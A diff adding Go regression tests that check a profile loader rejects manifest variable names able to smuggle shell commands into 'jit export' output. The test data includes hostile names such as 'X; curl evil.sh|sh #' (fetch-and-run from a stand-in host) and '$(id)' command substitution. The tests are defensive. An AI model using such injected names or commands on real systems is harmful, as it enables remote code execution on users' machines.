@@ -4,6 +4,7 @@
 package profile
 
 import (
+	"fmt"
 	"os"
 	"path/filepath"
 	"testing"
@@ -299,5 +300,53 @@ func TestOverlayDoesNotMutateInputs(t *testing.T) {
 	_ = Overlay(base, local)
 	if base["K"] != "root/K" {
 		t.Errorf("Overlay mutated its input layer: base[K] = %q", base["K"])
+	}
+}
+
+// A manifest key is rendered straight into shell by `jit export`, so a key
+// that is not a shell name must be refused at the load boundary — before any
+// consumer can act on it.
+//
+// The attack this closes: manifests are designed to be committed and shared,
+// so a hostile .jit/profiles/*.yaml arrives the way any repo content does. Its
+// VALUE would be safely single-quoted by exportCmd's shellQuote; the NAME was
+// interpolated verbatim, so `X; curl evil.sh|sh #` became a command inside the
+// line the user runs as `eval "$(jit export --profile ...)"`.
+func TestLoadRejectsUnusableVariableNames(t *testing.T) {
+	hostile := map[string]string{
+		"shell metacharacters": "X; curl evil.sh|sh #",
+		"command substitution": "$(id)",
+		"backticks":            "`id`",
+		"newline":              "GOOD\nexport EVIL",
+		"equals sign":          "FOO=BAR",
+		"leading digit":        "1FOO",
+		"dash":                 "MY-VAR",
+		"space":                "MY VAR",
+	}
+	for label, name := range hostile {
+		t.Run(label, func(t *testing.T) {
+			root := t.TempDir()
+			writeProfile(t, root, "evil", fmt.Sprintf("%q: stripe/dev-key\n", name))
+			if _, err := Load(root, "evil"); err == nil {
+				t.Fatalf("profile with variable name %q loaded without error; jit export would render it into shell verbatim", name)
+			}
+		})
+	}
+}
+
+// The rejection must not catch the names real manifests actually carry.
+func TestLoadAcceptsOrdinaryVariableNames(t *testing.T) {
+	root := t.TempDir()
+	writeProfile(t, root, "ok", `AWS_SECRET_ACCESS_KEY: aws/default
+_LEADING_UNDERSCORE: misc/one
+lowercase_name: misc/two
+MiXed123: misc/three
+`)
+	p, err := Load(root, "ok")
+	if err != nil {
+		t.Fatalf("ordinary variable names were rejected: %v", err)
+	}
+	if len(p) != 4 {
+		t.Fatalf("got %d entries, want 4", len(p))
 	}
 }
